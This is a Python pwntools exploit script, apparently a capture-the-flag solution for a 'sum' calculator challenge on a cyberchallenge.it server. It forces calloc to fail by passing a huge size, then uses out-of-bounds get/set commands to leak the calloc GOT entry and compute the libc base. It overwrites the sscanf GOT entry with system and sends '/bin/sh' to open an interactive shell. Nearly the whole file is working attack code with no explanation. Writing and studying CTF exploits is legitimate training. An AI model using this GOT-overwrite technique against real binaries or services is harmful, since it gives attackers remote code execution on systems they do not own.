#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('sum')
libc = ELF("./libc-2.27.so")

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote("sum.challs.cyberchallenge.it", 6014, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
tbreak calculator
br *0x400a77
continue
'''.format(**locals())

# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)
# FORTIFY:  Enabled

io = start()

#Force calloc to fail to NULL which usually is pointer 0x0
io.sendline(str(2**64))
io.sendline("get %d" % (exe.sym.got.calloc//8))
io.recvuntil("""[1] set <x> <d>
[2] get <x>
[3] sum
[4] bye

> """)
calloc_addr = io.recvline(False)

print(calloc_addr)
libc.address = int(calloc_addr.decode()) - libc.sym.calloc

#Stiamo usando la libc remota! Se non bestemmio guarda...
io.sendline(f"set {exe.sym.got.__isoc99_sscanf//8} {libc.sym.system}")

io.sendline(f"{int.from_bytes(b'/bin/sh', 'big')}")

io.interactive()

